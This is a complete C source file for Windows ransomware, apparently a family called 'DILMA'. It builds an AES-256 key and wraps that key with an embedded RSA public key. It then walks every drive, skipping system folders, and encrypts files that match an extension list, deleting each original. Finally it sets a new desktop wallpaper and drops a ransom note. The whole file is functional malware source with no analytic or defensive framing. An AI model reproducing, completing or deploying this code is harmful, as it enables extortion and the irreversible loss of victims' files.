#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>
#include <wchar.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <pthread.h>

#include "config.h"

const LPWSTR blackList[] = { L"Windows", L"Program Files", L"ProgramData", L"Microsoft", L"msys32", NULL };

struct aesBlob
{
	BLOBHEADER blob;
	DWORD size;
	BYTE bin[DILMA_AESBYTES];
};

struct encStruc
{
	HCRYPTPROV key;
	WCHAR pathFile[MAX_PATH];
};

HCRYPTPROV get_provider(void)
{
	HCRYPTPROV provider = 0;
	if(CryptAcquireContextW(&provider, NULL, MS_ENH_RSA_AES_PROV_W, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) == FALSE)
	{
		if(GetLastError() == (DWORD)NTE_KEYSET_NOT_DEF)
			CryptAcquireContextW(&provider, NULL, MS_ENH_RSA_AES_PROV_XP_W, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
	}

	return provider;
}

DWORD write_file(LPWSTR filename, BYTE *data, DWORD size)
{
	HANDLE file = CreateFileW(filename, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if(file != INVALID_HANDLE_VALUE)
	{
		WriteFile(file, data, size, &size, NULL);
		CloseHandle(file);
		return size;
	}
	return 0;
}

HCRYPTKEY gen_aes_key(HCRYPTPROV provider, HCRYPTKEY public)
{
	BYTE aesBin[DILMA_AESBYTES];

	if(CryptGenRandom(provider, DILMA_AESBYTES, aesBin))
	{
		HCRYPTKEY key;
		BYTE enc[DILMA_RSABYTES];
		DWORD size;
		struct aesBlob blob;

		blob.blob.bType    = PLAINTEXTKEYBLOB;
		blob.blob.bVersion = CUR_BLOB_VERSION;
		blob.blob.reserved = 0;
		blob.blob.aiKeyAlg = CALG_AES_256;
		blob.size = DILMA_AESBYTES;

		memcpy(blob.bin, aesBin, DILMA_AESBYTES);
		memcpy(enc, aesBin, DILMA_AESBYTES);
		memset(aesBin, 0, DILMA_AESBYTES);

		if(CryptImportKey(provider, (BYTE*)&blob, sizeof(struct aesBlob), 0, CRYPT_EXPORTABLE, &key))
		{
			size = DILMA_AESBYTES;

			memset(&blob, 0, sizeof(struct aesBlob));
			if(CryptEncrypt(public, 0, FALSE, 0, enc, &size, DILMA_RSABYTES))
			{
				WCHAR desktop[MAX_PATH], filename[MAX_PATH];

				SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, SHGFP_TYPE_CURRENT, desktop);
				PathCombineW(filename, desktop, DILMA_FILEKEY);
				if(write_file(filename, enc, size) == 0)
					return 0;

				return key;
			}
		}
	}
	return 0;
}

void *encrypt_file(void *encInfo)
{
	struct encStruc *encrypt = (struct encStruc*)encInfo;
	HANDLE input = CreateFileW(encrypt->pathFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	if(input != INVALID_HANDLE_VALUE)
	{
		WCHAR newPath[MAX_PATH];

		wmemset(newPath, 0, MAX_PATH);
		swprintf(newPath, MAX_PATH, L"%s%s", encrypt->pathFile, DILMA_FILEEXTENSION);

		HANDLE output = CreateFileW(newPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if(output != INVALID_HANDLE_VALUE)
		{
			BYTE data[DILMA_AESBYTES];
			DWORD read;

			while(1)
			{
				ReadFile(input, data, DILMA_AESBYTES, &read, NULL);
				if(read == 0)
					break;

				if(CryptEncrypt(encrypt->key, 0, (read < DILMA_AESBYTES), 0, data, &read, DILMA_AESBYTES))
				{
					WriteFile(output, data, read, &read, NULL);
				}
			}
			CloseHandle(output);
		}
		CloseHandle(input);
		DeleteFileW(encrypt->pathFile);
	}

	return NULL;
}

BOOL blacklisted(LPWSTR dir)
{
	for(unsigned int len = 0; blackList[len] != NULL; len++)
	{
		if(_wcsicmp(dir, blackList[len]) == 0)
			return TRUE;
	}
	return FALSE;
}

BOOL valid_file(LPWSTR pathFilename)
{
	LPWSTR extension = PathFindExtensionW(pathFilename);
	for(unsigned int len = 0; extensionList[len] != NULL; len++)
	{
		if(_wcsicmp(extension, extensionList[len]) == 0)
			return TRUE;
	}
	return FALSE;
}

int find_file(LPWSTR dir, HCRYPTKEY key)
{
	pthread_t tid;
	WCHAR path[MAX_PATH];
	WIN32_FIND_DATAW fd;
	struct encStruc encrypt;

	PathCombineW(path, dir, L"*");

	HANDLE handle = FindFirstFileW(path, &fd);
	if(handle == INVALID_HANDLE_VALUE)
		return 1;

	do
	{
		if(fd.cFileName[0] == L'.' && (fd.cFileName[1] == L'\0' || (fd.cFileName[1] == L'.' && fd.cFileName[2] == L'\0')))
			continue;

		PathCombineW(path, dir, fd.cFileName);
		if(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			if(blacklisted(fd.cFileName) != TRUE)
				find_file(path, key);
			continue;
		}

		if(valid_file(path) == TRUE)
		{
			encrypt.key = key;

			wmemcpy(encrypt.pathFile, path, MAX_PATH);
			pthread_create(&tid, NULL, encrypt_file, (void*)&encrypt);
			pthread_join(tid, NULL);
		}

	} while(FindNextFileW(handle, &fd) == TRUE);

	return 0;
}

void find_drive(HCRYPTKEY key)
{
	WCHAR drive, path[4];
	for(drive = L'A'; drive < (L'Z'+1); drive++)
	{
		path[0] = drive;
		path[1] = L':';
		path[2] = L'\0';

		find_file(path, key);
		//find_file(L"C:\\Users\\luladrao\\Desktop\\encrypt", key);
	}
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hProvInstance,
	LPSTR lpCmdLine, int nCmdShow)
{
	SetErrorMode(SEM_FAILCRITICALERRORS);

	HCRYPTPROV provider;
	if((provider = get_provider()) != 0)
	{
		HCRYPTKEY public; 
		if(CryptImportKey(provider, data6b657973, size6b657973, 0, CRYPT_EXPORTABLE, &public))
		{
			HCRYPTKEY key = gen_aes_key(provider, public);
			if(key != 0)
			{
				find_drive(key);

				WCHAR desktopPath[MAX_PATH], filename[MAX_PATH];

				SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, SHGFP_TYPE_CURRENT, desktopPath);

				PathCombineW(filename, desktopPath, DILMA_FILEWALLPAPER);
				write_file(filename, data6261636b, var6261636b);
				SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, filename, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

				PathCombineW(filename, desktopPath, DILMA_FILENOTE);
				write_file(filename, data6e6f7461, var6e6f7461);

				CryptDestroyKey(key);
			}
			CryptDestroyKey(public);
		}
		CryptReleaseContext(provider, 0);
	}
	return 0;
}